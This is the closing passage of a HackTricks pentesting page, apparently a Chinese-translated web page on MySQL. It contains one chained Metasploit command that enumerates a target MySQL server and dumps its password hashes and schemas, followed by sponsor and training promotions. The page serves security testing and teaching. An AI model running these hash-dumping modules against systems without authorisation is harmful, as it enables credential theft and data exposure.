Entry_4:
Name: MySql consolesless mfs enumeration
Description: MySql enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_version; set RHOSTS {IP}; set RPORT 3306; run; exit' &amp;&amp; msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_authbypass_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' &amp;&amp; msfconsole -q -x 'use auxiliary/admin/mysql/mysql_enum; set RHOSTS {IP}; set RPORT 3306; run; exit' &amp;&amp; msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' &amp;&amp; msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_schemadump; set RHOSTS {IP}; set RPORT 3306; run; exit'

</code></pre>
<p>​</p>
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
<p><a href="https://www.rootedcon.com/"><strong>RootedCON</strong></a> 是 <strong>西班牙</strong> 最相关的网络安全事件，也是 <strong>欧洲</strong> 最重要的活动之一。该大会 <strong>旨在促进技术知识</strong>，是各个学科技术和网络安全专业人士的热烈交流平台。</p>
<p>{% embed url="https://www.rootedcon.com/" %}</p>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a>** 上关注我们。**</li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../network-services-pentesting/3299-pentesting-saprouter.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../network-services-pentesting/pentesting-rdp.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../network-services-pentesting/3299-pentesting-saprouter.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../network-services-pentesting/pentesting-rdp.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
